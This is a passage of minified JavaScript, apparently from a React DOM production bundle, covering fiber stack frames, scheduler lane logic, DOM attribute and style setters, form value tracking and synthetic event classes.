  function ja(l) {
    l.memoizedState !== null && j(el, l);
    var t = _.current,
      e = Yd(t, l.type);
    t !== e && (j(X, l), j(_, e));
  }
  function xu(l) {
    X.current === l && (z(_), z(X)),
      el.current === l && (z(el), (vu._currentValue = N));
  }
  var Xn, rc;
  function Te(l) {
    if (Xn === void 0)
      try {
        throw Error();
      } catch (e) {
        var t = e.stack.trim().match(/\n( *(at )?)/);
        (Xn = (t && t[1]) || ""),
          (rc =
            -1 <
            e.stack.indexOf(`
    at`)
              ? " (<anonymous>)"
              : -1 < e.stack.indexOf("@")
              ? "@unknown:0:0"
              : "");
      }
    return (
      `
` +
      Xn +
      l +
      rc
    );
  }
  var Ln = !1;
  function Qn(l, t) {
    if (!l || Ln) return "";
    Ln = !0;
    var e = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
      var a = {
        DetermineComponentFrameRoot: function () {
          try {
            if (t) {
              var x = function () {
                throw Error();
              };
              if (
                (Object.defineProperty(x.prototype, "props", {
                  set: function () {
                    throw Error();
                  },
                }),
                typeof Reflect == "object" && Reflect.construct)
              ) {
                try {
                  Reflect.construct(x, []);
                } catch (g) {
                  var m = g;
                }
                Reflect.construct(l, [], x);
              } else {
                try {
                  x.call();
                } catch (g) {
                  m = g;
                }
                l.call(x.prototype);
              }
            } else {
              try {
                throw Error();
              } catch (g) {
                m = g;
              }
              (x = l()) &&
                typeof x.catch == "function" &&
                x.catch(function () {});
            }
          } catch (g) {
            if (g && m && typeof g.stack == "string") return [g.stack, m.stack];
          }
          return [null, null];
        },
      };
      a.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
      var u = Object.getOwnPropertyDescriptor(
        a.DetermineComponentFrameRoot,
        "name"
      );
      u &&
        u.configurable &&
        Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
          value: "DetermineComponentFrameRoot",
        });
      var n = a.DetermineComponentFrameRoot(),
        i = n[0],
        f = n[1];
      if (i && f) {
        var c = i.split(`
`),
          h = f.split(`
`);
        for (
          u = a = 0;
          a < c.length && !c[a].includes("DetermineComponentFrameRoot");

        )
          a++;
        for (; u < h.length && !h[u].includes("DetermineComponentFrameRoot"); )
          u++;
        if (a === c.length || u === h.length)
          for (
            a = c.length - 1, u = h.length - 1;
            1 <= a && 0 <= u && c[a] !== h[u];

          )
            u--;
        for (; 1 <= a && 0 <= u; a--, u--)
          if (c[a] !== h[u]) {
            if (a !== 1 || u !== 1)
              do
                if ((a--, u--, 0 > u || c[a] !== h[u])) {
                  var b =
                    `
` + c[a].replace(" at new ", " at ");
                  return (
                    l.displayName &&
                      b.includes("<anonymous>") &&
                      (b = b.replace("<anonymous>", l.displayName)),
                    b
                  );
                }
              while (1 <= a && 0 <= u);
            break;
          }
      }
    } finally {
      (Ln = !1), (Error.prepareStackTrace = e);
    }
    return (e = l ? l.displayName || l.name : "") ? Te(e) : "";
  }
  function M0(l, t) {
    switch (l.tag) {
      case 26:
      case 27:
      case 5:
        return Te(l.type);
      case 16:
        return Te("Lazy");
      case 13:
        return l.child !== t && t !== null
          ? Te("Suspense Fallback")
          : Te("Suspense");
      case 19:
        return Te("SuspenseList");
      case 0:
      case 15:
        return Qn(l.type, !1);
      case 11:
        return Qn(l.type.render, !1);
      case 1:
        return Qn(l.type, !0);
      case 31:
        return Te("Activity");
      default:
        return "";
    }
  }
  function yc(l) {
    try {
      var t = "",
        e = null;
      do (t += M0(l, e)), (e = l), (l = l.return);
      while (l);
      return t;
    } catch (a) {
      return (
        `
Error generating stack: ` +
        a.message +
        `
` +
        a.stack
      );
    }
  }
  var Zn = Object.prototype.hasOwnProperty,
    Vn = E.unstable_scheduleCallback,
    Kn = E.unstable_cancelCallback,
    _0 = E.unstable_shouldYield,
    O0 = E.unstable_requestPaint,
    at = E.unstable_now,
    C0 = E.unstable_getCurrentPriorityLevel,
    hc = E.unstable_ImmediatePriority,
    vc = E.unstable_UserBlockingPriority,
    zu = E.unstable_NormalPriority,
    D0 = E.unstable_LowPriority,
    mc = E.unstable_IdlePriority,
    U0 = E.log,
    H0 = E.unstable_setDisableYieldValue,
    Ma = null,
    ut = null;
  function It(l) {
    if (
      (typeof U0 == "function" && H0(l),
      ut && typeof ut.setStrictMode == "function")
    )
      try {
        ut.setStrictMode(Ma, l);
      } catch {}
  }
  var nt = Math.clz32 ? Math.clz32 : N0,
    R0 = Math.log,
    B0 = Math.LN2;
  function N0(l) {
    return (l >>>= 0), l === 0 ? 32 : (31 - ((R0(l) / B0) | 0)) | 0;
  }
  var Tu = 256,
    Eu = 262144,
    Au = 4194304;
  function Ee(l) {
    var t = l & 42;
    if (t !== 0) return t;
    switch (l & -l) {
      case 1:
        return 1;
      case 2:
        return 2;
      case 4:
        return 4;
      case 8:
        return 8;
      case 16:
        return 16;
      case 32:
        return 32;
      case 64:
        return 64;
      case 128:
        return 128;
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
        return l & 261888;
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
        return l & 3932160;
      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
        return l & 62914560;
      case 67108864:
        return 67108864;
      case 134217728:
        return 134217728;
      case 268435456:
        return 268435456;
      case 536870912:
        return 536870912;
      case 1073741824:
        return 0;
      default:
        return l;
    }
  }
  function ju(l, t, e) {
    var a = l.pendingLanes;
    if (a === 0) return 0;
    var u = 0,
      n = l.suspendedLanes,
      i = l.pingedLanes;
    l = l.warmLanes;
    var f = a & 134217727;
    return (
      f !== 0
        ? ((a = f & ~n),
          a !== 0
            ? (u = Ee(a))
            : ((i &= f),
              i !== 0
                ? (u = Ee(i))
                : e || ((e = f & ~l), e !== 0 && (u = Ee(e)))))
        : ((f = a & ~n),
          f !== 0
            ? (u = Ee(f))
            : i !== 0
            ? (u = Ee(i))
            : e || ((e = a & ~l), e !== 0 && (u = Ee(e)))),
      u === 0
        ? 0
        : t !== 0 &&
          t !== u &&
          (t & n) === 0 &&
          ((n = u & -u),
          (e = t & -t),
          n >= e || (n === 32 && (e & 4194048) !== 0))
        ? t
        : u
    );
  }
  function _a(l, t) {
    return (l.pendingLanes & ~(l.suspendedLanes & ~l.pingedLanes) & t) === 0;
  }
  function q0(l, t) {
    switch (l) {
      case 1:
      case 2:
      case 4:
      case 8:
      case 64:
        return t + 250;
      case 16:
      case 32:
      case 128:
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
        return t + 5e3;
      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
        return -1;
      case 67108864:
      case 134217728:
      case 268435456:
      case 536870912:
      case 1073741824:
        return -1;
      default:
        return -1;
    }
  }
  function gc() {
    var l = Au;
    return (Au <<= 1), (Au & 62914560) === 0 && (Au = 4194304), l;
  }
  function Jn(l) {
    for (var t = [], e = 0; 31 > e; e++) t.push(l);
    return t;
  }
  function Oa(l, t) {
    (l.pendingLanes |= t),
      t !== 268435456 &&
        ((l.suspendedLanes = 0), (l.pingedLanes = 0), (l.warmLanes = 0));
  }
  function Y0(l, t, e, a, u, n) {
    var i = l.pendingLanes;
    (l.pendingLanes = e),
      (l.suspendedLanes = 0),
      (l.pingedLanes = 0),
      (l.warmLanes = 0),
      (l.expiredLanes &= e),
      (l.entangledLanes &= e),
      (l.errorRecoveryDisabledLanes &= e),
      (l.shellSuspendCounter = 0);
    var f = l.entanglements,
      c = l.expirationTimes,
      h = l.hiddenUpdates;
    for (e = i & ~e; 0 < e; ) {
      var b = 31 - nt(e),
        x = 1 << b;
      (f[b] = 0), (c[b] = -1);
      var m = h[b];
      if (m !== null)
        for (h[b] = null, b = 0; b < m.length; b++) {
          var g = m[b];
          g !== null && (g.lane &= -536870913);
        }
      e &= ~x;
    }
    a !== 0 && Sc(l, a, 0),
      n !== 0 && u === 0 && l.tag !== 0 && (l.suspendedLanes |= n & ~(i & ~t));
  }
  function Sc(l, t, e) {
    (l.pendingLanes |= t), (l.suspendedLanes &= ~t);
    var a = 31 - nt(t);
    (l.entangledLanes |= t),
      (l.entanglements[a] = l.entanglements[a] | 1073741824 | (e & 261930));
  }
  function bc(l, t) {
    var e = (l.entangledLanes |= t);
    for (l = l.entanglements; e; ) {
      var a = 31 - nt(e),
        u = 1 << a;
      (u & t) | (l[a] & t) && (l[a] |= t), (e &= ~u);
    }
  }
  function pc(l, t) {
    var e = t & -t;
    return (
      (e = (e & 42) !== 0 ? 1 : wn(e)),
      (e & (l.suspendedLanes | t)) !== 0 ? 0 : e
    );
  }
  function wn(l) {
    switch (l) {
      case 2:
        l = 1;
        break;
      case 8:
        l = 4;
        break;
      case 32:
        l = 16;
        break;
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
        l = 128;
        break;
      case 268435456:
        l = 134217728;
        break;
      default:
        l = 0;
    }
    return l;
  }
  function Wn(l) {
    return (
      (l &= -l),
      2 < l ? (8 < l ? ((l & 134217727) !== 0 ? 32 : 268435456) : 8) : 2
    );
  }
  function xc() {
    var l = A.p;
    return l !== 0 ? l : ((l = window.event), l === void 0 ? 32 : f0(l.type));
  }
  function zc(l, t) {
    var e = A.p;
    try {
      return (A.p = l), t();
    } finally {
      A.p = e;
    }
  }
  var Pt = Math.random().toString(36).slice(2),
    ql = "__reactFiber$" + Pt,
    $l = "__reactProps$" + Pt,
    Qe = "__reactContainer$" + Pt,
    kn = "__reactEvents$" + Pt,
    G0 = "__reactListeners$" + Pt,
    X0 = "__reactHandles$" + Pt,
    Tc = "__reactResources$" + Pt,
    Ca = "__reactMarker$" + Pt;
  function $n(l) {
    delete l[ql], delete l[$l], delete l[kn], delete l[G0], delete l[X0];
  }
  function Ze(l) {
    var t = l[ql];
    if (t) return t;
    for (var e = l.parentNode; e; ) {
      if ((t = e[Qe] || e[ql])) {
        if (
          ((e = t.alternate),
          t.child !== null || (e !== null && e.child !== null))
        )
          for (l = Kd(l); l !== null; ) {
            if ((e = l[ql])) return e;
            l = Kd(l);
          }
        return t;
      }
      (l = e), (e = l.parentNode);
    }
    return null;
  }
  function Ve(l) {
    if ((l = l[ql] || l[Qe])) {
      var t = l.tag;
      if (
        t === 5 ||
        t === 6 ||
        t === 13 ||
        t === 31 ||
        t === 26 ||
        t === 27 ||
        t === 3
      )
        return l;
    }
    return null;
  }
  function Da(l) {
    var t = l.tag;
    if (t === 5 || t === 26 || t === 27 || t === 6) return l.stateNode;
    throw Error(v(33));
  }
  function Ke(l) {
    var t = l[Tc];
    return (
      t ||
        (t = l[Tc] =
          { hoistableStyles: new Map(), hoistableScripts: new Map() }),
      t
    );
  }
  function Dl(l) {
    l[Ca] = !0;
  }
  var Ec = new Set(),
    Ac = {};
  function Ae(l, t) {
    Je(l, t), Je(l + "Capture", t);
  }
  function Je(l, t) {
    for (Ac[l] = t, l = 0; l < t.length; l++) Ec.add(t[l]);
  }
  var L0 = RegExp(
      "^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"
    ),
    jc = {},
    Mc = {};
  function Q0(l) {
    return Zn.call(Mc, l)
      ? !0
      : Zn.call(jc, l)
      ? !1
      : L0.test(l)
      ? (Mc[l] = !0)
      : ((jc[l] = !0), !1);
  }
  function Mu(l, t, e) {
    if (Q0(t))
      if (e === null) l.removeAttribute(t);
      else {
        switch (typeof e) {
          case "undefined":
          case "function":
          case "symbol":
            l.removeAttribute(t);
            return;
          case "boolean":
            var a = t.toLowerCase().slice(0, 5);
            if (a !== "data-" && a !== "aria-") {
              l.removeAttribute(t);
              return;
            }
        }
        l.setAttribute(t, "" + e);
      }
  }
  function _u(l, t, e) {
    if (e === null) l.removeAttribute(t);
    else {
      switch (typeof e) {
        case "undefined":
        case "function":
        case "symbol":
        case "boolean":
          l.removeAttribute(t);
          return;
      }
      l.setAttribute(t, "" + e);
    }
  }
  function Ht(l, t, e, a) {
    if (a === null) l.removeAttribute(e);
    else {
      switch (typeof a) {
        case "undefined":
        case "function":
        case "symbol":
        case "boolean":
          l.removeAttribute(e);
          return;
      }
      l.setAttributeNS(t, e, "" + a);
    }
  }
  function vt(l) {
    switch (typeof l) {
      case "bigint":
      case "boolean":
      case "number":
      case "string":
      case "undefined":
        return l;
      case "object":
        return l;
      default:
        return "";
    }
  }
  function _c(l) {
    var t = l.type;
    return (
      (l = l.nodeName) &&
      l.toLowerCase() === "input" &&
      (t === "checkbox" || t === "radio")
    );
  }
  function Z0(l, t, e) {
    var a = Object.getOwnPropertyDescriptor(l.constructor.prototype, t);
    if (
      !l.hasOwnProperty(t) &&
      typeof a < "u" &&
      typeof a.get == "function" &&
      typeof a.set == "function"
    ) {
      var u = a.get,
        n = a.set;
      return (
        Object.defineProperty(l, t, {
          configurable: !0,
          get: function () {
            return u.call(this);
          },
          set: function (i) {
            (e = "" + i), n.call(this, i);
          },
        }),
        Object.defineProperty(l, t, { enumerable: a.enumerable }),
        {
          getValue: function () {
            return e;
          },
          setValue: function (i) {
            e = "" + i;
          },
          stopTracking: function () {
            (l._valueTracker = null), delete l[t];
          },
        }
      );
    }
  }
  function Fn(l) {
    if (!l._valueTracker) {
      var t = _c(l) ? "checked" : "value";
      l._valueTracker = Z0(l, t, "" + l[t]);
    }
  }
  function Oc(l) {
    if (!l) return !1;
    var t = l._valueTracker;
    if (!t) return !0;
    var e = t.getValue(),
      a = "";
    return (
      l && (a = _c(l) ? (l.checked ? "true" : "false") : l.value),
      (l = a),
      l !== e ? (t.setValue(l), !0) : !1
    );
  }
  function Ou(l) {
    if (
      ((l = l || (typeof document < "u" ? document : void 0)), typeof l > "u")
    )
      return null;
    try {
      return l.activeElement || l.body;
    } catch {
      return l.body;
    }
  }
  var V0 = /[\n"\\]/g;
  function mt(l) {
    return l.replace(V0, function (t) {
      return "\\" + t.charCodeAt(0).toString(16) + " ";
    });
  }
  function In(l, t, e, a, u, n, i, f) {
    (l.name = ""),
      i != null &&
      typeof i != "function" &&
      typeof i != "symbol" &&
      typeof i != "boolean"
        ? (l.type = i)
        : l.removeAttribute("type"),
      t != null
        ? i === "number"
          ? ((t === 0 && l.value === "") || l.value != t) &&
            (l.value = "" + vt(t))
          : l.value !== "" + vt(t) && (l.value = "" + vt(t))
        : (i !== "submit" && i !== "reset") || l.removeAttribute("value"),
      t != null
        ? Pn(l, i, vt(t))
        : e != null
        ? Pn(l, i, vt(e))
        : a != null && l.removeAttribute("value"),
      u == null && n != null && (l.defaultChecked = !!n),
      u != null &&
        (l.checked = u && typeof u != "function" && typeof u != "symbol"),
      f != null &&
      typeof f != "function" &&
      typeof f != "symbol" &&
      typeof f != "boolean"
        ? (l.name = "" + vt(f))
        : l.removeAttribute("name");
  }
  function Cc(l, t, e, a, u, n, i, f) {
    if (
      (n != null &&
        typeof n != "function" &&
        typeof n != "symbol" &&
        typeof n != "boolean" &&
        (l.type = n),
      t != null || e != null)
    ) {
      if (!((n !== "submit" && n !== "reset") || t != null)) {
        Fn(l);
        return;
      }
      (e = e != null ? "" + vt(e) : ""),
        (t = t != null ? "" + vt(t) : e),
        f || t === l.value || (l.value = t),
        (l.defaultValue = t);
    }
    (a = a ?? u),
      (a = typeof a != "function" && typeof a != "symbol" && !!a),
      (l.checked = f ? l.checked : !!a),
      (l.defaultChecked = !!a),
      i != null &&
        typeof i != "function" &&
        typeof i != "symbol" &&
        typeof i != "boolean" &&
        (l.name = i),
      Fn(l);
  }
  function Pn(l, t, e) {
    (t === "number" && Ou(l.ownerDocument) === l) ||
      l.defaultValue === "" + e ||
      (l.defaultValue = "" + e);
  }
  function we(l, t, e, a) {
    if (((l = l.options), t)) {
      t = {};
      for (var u = 0; u < e.length; u++) t["$" + e[u]] = !0;
      for (e = 0; e < l.length; e++)
        (u = t.hasOwnProperty("$" + l[e].value)),
          l[e].selected !== u && (l[e].selected = u),
          u && a && (l[e].defaultSelected = !0);
    } else {
      for (e = "" + vt(e), t = null, u = 0; u < l.length; u++) {
        if (l[u].value === e) {
          (l[u].selected = !0), a && (l[u].defaultSelected = !0);
          return;
        }
        t !== null || l[u].disabled || (t = l[u]);
      }
      t !== null && (t.selected = !0);
    }
  }
  function Dc(l, t, e) {
    if (
      t != null &&
      ((t = "" + vt(t)), t !== l.value && (l.value = t), e == null)
    ) {
      l.defaultValue !== t && (l.defaultValue = t);
      return;
    }
    l.defaultValue = e != null ? "" + vt(e) : "";
  }
  function Uc(l, t, e, a) {
    if (t == null) {
      if (a != null) {
        if (e != null) throw Error(v(92));
        if (kl(a)) {
          if (1 < a.length) throw Error(v(93));
          a = a[0];
        }
        e = a;
      }
      e == null && (e = ""), (t = e);
    }
    (e = vt(t)),
      (l.defaultValue = e),
      (a = l.textContent),
      a === e && a !== "" && a !== null && (l.value = a),
      Fn(l);
  }
  function We(l, t) {
    if (t) {
      var e = l.firstChild;
      if (e && e === l.lastChild && e.nodeType === 3) {
        e.nodeValue = t;
        return;
      }
    }
    l.textContent = t;
  }
  var K0 = new Set(
    "animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(
      " "
    )
  );
  function Hc(l, t, e) {
    var a = t.indexOf("--") === 0;
    e == null || typeof e == "boolean" || e === ""
      ? a
        ? l.setProperty(t, "")
        : t === "float"
        ? (l.cssFloat = "")
        : (l[t] = "")
      : a
      ? l.setProperty(t, e)
      : typeof e != "number" || e === 0 || K0.has(t)
      ? t === "float"
        ? (l.cssFloat = e)
        : (l[t] = ("" + e).trim())
      : (l[t] = e + "px");
  }
  function Rc(l, t, e) {
    if (t != null && typeof t != "object") throw Error(v(62));
    if (((l = l.style), e != null)) {
      for (var a in e)
        !e.hasOwnProperty(a) ||
          (t != null && t.hasOwnProperty(a)) ||
          (a.indexOf("--") === 0
            ? l.setProperty(a, "")
            : a === "float"
            ? (l.cssFloat = "")
            : (l[a] = ""));
      for (var u in t)
        (a = t[u]), t.hasOwnProperty(u) && e[u] !== a && Hc(l, u, a);
    } else for (var n in t) t.hasOwnProperty(n) && Hc(l, n, t[n]);
  }
  function li(l) {
    if (l.indexOf("-") === -1) return !1;
    switch (l) {
      case "annotation-xml":
      case "color-profile":
      case "font-face":
      case "font-face-src":
      case "font-face-uri":
      case "font-face-format":
      case "font-face-name":
      case "missing-glyph":
        return !1;
      default:
        return !0;
    }
  }
  var J0 = new Map([
      ["acceptCharset", "accept-charset"],
      ["htmlFor", "for"],
      ["httpEquiv", "http-equiv"],
      ["crossOrigin", "crossorigin"],
      ["accentHeight", "accent-height"],
      ["alignmentBaseline", "alignment-baseline"],
      ["arabicForm", "arabic-form"],
      ["baselineShift", "baseline-shift"],
      ["capHeight", "cap-height"],
      ["clipPath", "clip-path"],
      ["clipRule", "clip-rule"],
      ["colorInterpolation", "color-interpolation"],
      ["colorInterpolationFilters", "color-interpolation-filters"],
      ["colorProfile", "color-profile"],
      ["colorRendering", "color-rendering"],
      ["dominantBaseline", "dominant-baseline"],
      ["enableBackground", "enable-background"],
      ["fillOpacity", "fill-opacity"],
      ["fillRule", "fill-rule"],
      ["floodColor", "flood-color"],
      ["floodOpacity", "flood-opacity"],
      ["fontFamily", "font-family"],
      ["fontSize", "font-size"],
      ["fontSizeAdjust", "font-size-adjust"],
      ["fontStretch", "font-stretch"],
      ["fontStyle", "font-style"],
      ["fontVariant", "font-variant"],
      ["fontWeight", "font-weight"],
      ["glyphName", "glyph-name"],
      ["glyphOrientationHorizontal", "glyph-orientation-horizontal"],
      ["glyphOrientationVertical", "glyph-orientation-vertical"],
      ["horizAdvX", "horiz-adv-x"],
      ["horizOriginX", "horiz-origin-x"],
      ["imageRendering", "image-rendering"],
      ["letterSpacing", "letter-spacing"],
      ["lightingColor", "lighting-color"],
      ["markerEnd", "marker-end"],
      ["markerMid", "marker-mid"],
      ["markerStart", "marker-start"],
      ["overlinePosition", "overline-position"],
      ["overlineThickness", "overline-thickness"],
      ["paintOrder", "paint-order"],
      ["panose-1", "panose-1"],
      ["pointerEvents", "pointer-events"],
      ["renderingIntent", "rendering-intent"],
      ["shapeRendering", "shape-rendering"],
      ["stopColor", "stop-color"],
      ["stopOpacity", "stop-opacity"],
      ["strikethroughPosition", "strikethrough-position"],
      ["strikethroughThickness", "strikethrough-thickness"],
      ["strokeDasharray", "stroke-dasharray"],
      ["strokeDashoffset", "stroke-dashoffset"],
      ["strokeLinecap", "stroke-linecap"],
      ["strokeLinejoin", "stroke-linejoin"],
      ["strokeMiterlimit", "stroke-miterlimit"],
      ["strokeOpacity", "stroke-opacity"],
      ["strokeWidth", "stroke-width"],
      ["textAnchor", "text-anchor"],
      ["textDecoration", "text-decoration"],
      ["textRendering", "text-rendering"],
      ["transformOrigin", "transform-origin"],
      ["underlinePosition", "underline-position"],
      ["underlineThickness", "underline-thickness"],
      ["unicodeBidi", "unicode-bidi"],
      ["unicodeRange", "unicode-range"],
      ["unitsPerEm", "units-per-em"],
      ["vAlphabetic", "v-alphabetic"],
      ["vHanging", "v-hanging"],
      ["vIdeographic", "v-ideographic"],
      ["vMathematical", "v-mathematical"],
      ["vectorEffect", "vector-effect"],
      ["vertAdvY", "vert-adv-y"],
      ["vertOriginX", "vert-origin-x"],
      ["vertOriginY", "vert-origin-y"],
      ["wordSpacing", "word-spacing"],
      ["writingMode", "writing-mode"],
      ["xmlnsXlink", "xmlns:xlink"],
      ["xHeight", "x-height"],
    ]),
    w0 =
      /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
  function Cu(l) {
    return w0.test("" + l)
      ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')"
      : l;
  }
  function Rt() {}
  var ti = null;
  function ei(l) {
    return (
      (l = l.target || l.srcElement || window),
      l.correspondingUseElement && (l = l.correspondingUseElement),
      l.nodeType === 3 ? l.parentNode : l
    );
  }
  var ke = null,
    $e = null;
  function Bc(l) {
    var t = Ve(l);
    if (t && (l = t.stateNode)) {
      var e = l[$l] || null;
      l: switch (((l = t.stateNode), t.type)) {
        case "input":
          if (
            (In(
              l,
              e.value,
              e.defaultValue,
              e.defaultValue,
              e.checked,
              e.defaultChecked,
              e.type,
              e.name
            ),
            (t = e.name),
            e.type === "radio" && t != null)
          ) {
            for (e = l; e.parentNode; ) e = e.parentNode;
            for (
              e = e.querySelectorAll(
                'input[name="' + mt("" + t) + '"][type="radio"]'
              ),
                t = 0;
              t < e.length;
              t++
            ) {
              var a = e[t];
              if (a !== l && a.form === l.form) {
                var u = a[$l] || null;
                if (!u) throw Error(v(90));
                In(
                  a,
                  u.value,
                  u.defaultValue,
                  u.defaultValue,
                  u.checked,
                  u.defaultChecked,
                  u.type,
                  u.name
                );
              }
            }
            for (t = 0; t < e.length; t++)
              (a = e[t]), a.form === l.form && Oc(a);
          }
          break l;
        case "textarea":
          Dc(l, e.value, e.defaultValue);
          break l;
        case "select":
          (t = e.value), t != null && we(l, !!e.multiple, t, !1);
      }
    }
  }
  var ai = !1;
  function Nc(l, t, e) {
    if (ai) return l(t, e);
    ai = !0;
    try {
      var a = l(t);
      return a;
    } finally {
      if (
        ((ai = !1),
        (ke !== null || $e !== null) &&
          (Sn(), ke && ((t = ke), (l = $e), ($e = ke = null), Bc(t), l)))
      )
        for (t = 0; t < l.length; t++) Bc(l[t]);
    }
  }
  function Ua(l, t) {
    var e = l.stateNode;
    if (e === null) return null;
    var a = e[$l] || null;
    if (a === null) return null;
    e = a[t];
    l: switch (t) {
      case "onClick":
      case "onClickCapture":
      case "onDoubleClick":
      case "onDoubleClickCapture":
      case "onMouseDown":
      case "onMouseDownCapture":
      case "onMouseMove":
      case "onMouseMoveCapture":
      case "onMouseUp":
      case "onMouseUpCapture":
      case "onMouseEnter":
        (a = !a.disabled) ||
          ((l = l.type),
          (a = !(
            l === "button" ||
            l === "input" ||
            l === "select" ||
            l === "textarea"
          ))),
          (l = !a);
        break l;
      default:
        l = !1;
    }
    if (l) return null;
    if (e && typeof e != "function") throw Error(v(231, t, typeof e));
    return e;
  }
  var Bt = !(
      typeof window > "u" ||
      typeof window.document > "u" ||
      typeof window.document.createElement > "u"
    ),
    ui = !1;
  if (Bt)
    try {
      var Ha = {};
      Object.defineProperty(Ha, "passive", {
        get: function () {
          ui = !0;
        },
      }),
        window.addEventListener("test", Ha, Ha),
        window.removeEventListener("test", Ha, Ha);
    } catch {
      ui = !1;
    }
  var le = null,
    ni = null,
    Du = null;
  function qc() {
    if (Du) return Du;
    var l,
      t = ni,
      e = t.length,
      a,
      u = "value" in le ? le.value : le.textContent,
      n = u.length;
    for (l = 0; l < e && t[l] === u[l]; l++);
    var i = e - l;
    for (a = 1; a <= i && t[e - a] === u[n - a]; a++);
    return (Du = u.slice(l, 1 < a ? 1 - a : void 0));
  }
  function Uu(l) {
    var t = l.keyCode;
    return (
      "charCode" in l
        ? ((l = l.charCode), l === 0 && t === 13 && (l = 13))
        : (l = t),
      l === 10 && (l = 13),
      32 <= l || l === 13 ? l : 0
    );
  }
  function Hu() {
    return !0;
  }
  function Yc() {
    return !1;
  }
  function Fl(l) {
    function t(e, a, u, n, i) {
      (this._reactName = e),
        (this._targetInst = u),
        (this.type = a),
        (this.nativeEvent = n),
        (this.target = i),
        (this.currentTarget = null);
      for (var f in l)
        l.hasOwnProperty(f) && ((e = l[f]), (this[f] = e ? e(n) : n[f]));
      return (
        (this.isDefaultPrevented = (
          n.defaultPrevented != null ? n.defaultPrevented : n.returnValue === !1
        )
          ? Hu
          : Yc),
        (this.isPropagationStopped = Yc),
        this
      );
    }
    return (
      R(t.prototype, {
        preventDefault: function () {
          this.defaultPrevented = !0;
          var e = this.nativeEvent;
          e &&
            (e.preventDefault
              ? e.preventDefault()
              : typeof e.returnValue != "unknown" && (e.returnValue = !1),
            (this.isDefaultPrevented = Hu));
        },
        stopPropagation: function () {
          var e = this.nativeEvent;
          e &&
            (e.stopPropagation
              ? e.stopPropagation()
              : typeof e.cancelBubble != "unknown" && (e.cancelBubble = !0),
            (this.isPropagationStopped = Hu));
        },
        persist: function () {},
        isPersistent: Hu,
      }),
      t
    );
  }
  var je = {
      eventPhase: 0,
      bubbles: 0,
      cancelable: 0,
      timeStamp: function (l) {
        return l.timeStamp || Date.now();
      },
      defaultPrevented: 0,
      isTrusted: 0,
    },
    Ru = Fl(je),
    Ra = R({}, je, { view: 0, detail: 0 }),
    W0 = Fl(Ra),
    ii,
    fi,
    Ba,
    Bu = R({}, Ra, {
      screenX: 0,
      screenY: 0,
      clientX: 0,
      clientY: 0,
      pageX: 0,
      pageY: 0,
      ctrlKey: 0,
      shiftKey: 0,
      altKey: 0,
      metaKey: 0,
      getModifierState: si,
      button: 0,
      buttons: 0,
      relatedTarget: function (l) {
        return l.relatedTarget === void 0
          ? l.fromElement === l.srcElement
            ? l.toElement
            : l.fromElement
          : l.relatedTarget;
      },
      movementX: function (l) {
        return "movementX" in l
          ? l.movementX
          : (l !== Ba &&
              (Ba && l.type === "mousemove"
                ? ((ii = l.screenX - Ba.screenX), (fi = l.screenY - Ba.screenY))
                : (fi = ii = 0),
              (Ba = l)),
            ii);
      },
      movementY: function (l) {
        return "movementY" in l ? l.movementY : fi;
      },
    }),
    Gc = Fl(Bu),
    k0 = R({}, Bu, { dataTransfer: 0 }),
    $0 = Fl(k0),
    F0 = R({}, Ra, { relatedTarget: 0 }),
    ci = Fl(F0),
    I0 = R({}, je, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
    P0 = Fl(I0),
    l1 = R({}, je, {
      clipboardData: function (l) {
        return "clipboardData" in l ? l.clipboardData : window.clipboardData;
      },
    }),
    t1 = Fl(l1),
    e1 = R({}, je, { data: 0 }),
    Xc = Fl(e1),
    a1 = {
      Esc: "Escape",
      Spacebar: " ",
      Left: "ArrowLeft",
      Up: "ArrowUp",
      Right: "ArrowRight",
      Down: "ArrowDown",
      Del: "Delete",
      Win: "OS",
      Menu: "ContextMenu",
